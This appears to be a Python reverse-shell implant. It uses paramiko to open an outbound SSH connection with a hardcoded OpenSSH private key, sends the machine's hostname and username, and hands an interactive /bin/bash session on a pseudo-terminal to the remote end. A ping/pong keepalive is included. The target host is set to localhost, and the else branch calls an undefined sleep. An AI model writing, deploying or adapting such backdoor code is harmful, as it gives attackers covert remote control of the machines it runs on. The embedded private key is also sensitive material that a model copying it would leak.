#! /usr/bin/env python3

import paramiko
from threading import Thread
import subprocess
import os, pty, getpass, time, io
import tempfile

HOST = '127.0.0.1'
USERNAME = 'test'
PORT = 5002
killme = False
with open('/etc/hostname', 'r') as h:
    hostname = h.readline().strip('\n')
username = getpass.getuser()

privkey = '''-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----'''

#with tempfile.NamedTemporaryFile() as tp:
#    tp.write(privkey)
#    print(tp.read())
key = paramiko.RSAKey.from_private_key(io.StringIO(privkey))

def listen(pty, chan):
    while True:
        data = os.read(pty, 1024)
        chan.send(data)
        #chan.send(os.read(pty, 1024))
        time.sleep(0.25)

def run_ssh():
    global key
    if os.system("ping -c 1 " + HOST) == 0:
        
        with paramiko.SSHClient() as c:

            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            #c.connect(HOST, port=PORT, username=USERNAME, password=USERNAME, compress=True)
            c.connect(HOST, port=PORT, username=USERNAME, pkey=key, compress=True)
            chan = c.get_transport().open_session()
            chan.sendall(hostname)
            chan.sendall(username)

            #p =  PtyProcessUnicode.spawn(['/bin/bash', '-i'])
            mfd, sfd = pty.openpty()
            with subprocess.Popen(["/bin/bash", "-i"], stdin=sfd, stdout=sfd, stderr=sfd, start_new_session=True) as p:

                listen_thread = Thread(target=listen, args=(mfd, chan), daemon=True)
                listen_thread.start()
                while True:
                    if chan.recv_ready() is True:
                        data = chan.recv(1024)
                        if data == b'ping':
                            chan.send('pong')
                        os.write(mfd, data)
                        #os.write(mfd, chan.recv(1024))
                    time.sleep(0.25)
    else :
        sleep(20)
